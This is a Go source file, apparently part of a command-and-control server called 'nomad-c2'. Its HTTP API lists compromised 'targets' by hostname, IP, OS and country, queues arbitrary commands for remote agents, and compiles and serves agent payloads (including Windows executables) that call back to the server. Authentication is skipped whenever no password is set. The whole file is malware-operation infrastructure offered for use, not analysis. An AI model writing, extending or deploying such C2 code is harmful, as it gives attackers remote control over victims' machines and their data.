package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"nomad-c2/server/db"
	"nomad-c2/server/payload"
	"path/filepath"
	"os"

	"github.com/gorilla/mux"
)

func SetupRoutes() *mux.Router {
	r := mux.NewRouter()

	// Static files (Web UI)
	// r.PathPrefix("/").Handler(http.FileServer(http.Dir("./dashboard/dist")))

	api := r.PathPrefix("/api").Subrouter()
	api.Use(AuthMiddleware)
	api.HandleFunc("/targets", getTargets).Methods("GET")
	api.HandleFunc("/targets/{id}/command", sendCommand).Methods("POST")
	api.HandleFunc("/payloads", generatePayload).Methods("POST")

	return r
}

func getTargets(w http.ResponseWriter, r *http.Request) {
	rows, err := db.DB.Query("SELECT id, hostname, ip, os, country_code, last_seen, status FROM agents ORDER BY last_seen DESC")
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	defer rows.Close()

	var targets []map[string]interface{}
	for rows.Next() {
		var id, hostname, ip, os, country, status string
		var lastSeen interface{}
		rows.Scan(&id, &hostname, &ip, &os, &country, &lastSeen, &status)
		
		targets = append(targets, map[string]interface{}{
			"id":           id,
			"hostname":     hostname,
			"ip":           ip,
			"os":           os,
			"country_code": country,
			"last_seen":    lastSeen,
			"status":       status,
		})
	}
	
	json.NewEncoder(w).Encode(targets)
}

func sendCommand(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	agentID := vars["id"]

	var data struct {
		Command string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "Invalid request", 400)
		return
	}

	_, err := db.DB.Exec("INSERT INTO commands (agent_id, command, status) VALUES ($1, $2, 'Pending')", agentID, data.Command)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	w.WriteHeader(http.StatusAccepted)
}

func generatePayload(w http.ResponseWriter, r *http.Request) {
	var data struct {
		OS   string `json:"os"`
		Arch string `json:"arch"`
	}
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "Invalid request", 400)
		return
	}

	filename := fmt.Sprintf("nomad_agent_%s_%s", data.OS, data.Arch)
	if data.OS == "windows" {
		filename += ".exe"
	}
	outputPath := filepath.Join("payloads", filename)

	err := payload.BuildGoAgent(data.OS, data.Arch, r.Host, outputPath)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	w.Header().Set("Content-Disposition", "attachment; filename="+filename)
	http.ServeFile(w, r, outputPath)
}

func AuthMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		appPass := os.Getenv("APP_PASSWORD")
		if appPass == "" {
			next.ServeHTTP(w, r)
			return
		}

		pass := r.Header.Get("X-Nomad-Pass")
		if pass != appPass {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		next.ServeHTTP(w, r)
	})
}
